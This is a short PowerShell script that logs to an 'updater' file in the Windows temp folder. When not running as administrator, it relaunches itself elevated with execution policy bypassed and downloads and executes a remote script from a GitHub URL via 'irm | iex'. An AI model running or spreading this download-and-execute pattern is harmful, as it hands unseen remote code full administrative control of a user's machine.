# Define a log file path
$logPath = "C:\Windows\Temp\updater_log.txt"

function Write-Log {
    param ($msg)
    $timestamp = "[{0}] $msg" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    $timestamp | Out-File -FilePath $logPath -Append -Encoding utf8
}

# This block checks for admin rights
$currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)

if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # Relaunch this script with elevated rights
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1 | iex`""
    exit
}

# Code below this line runs only after elevation
Write-Output "✅ Script is now running as admin."

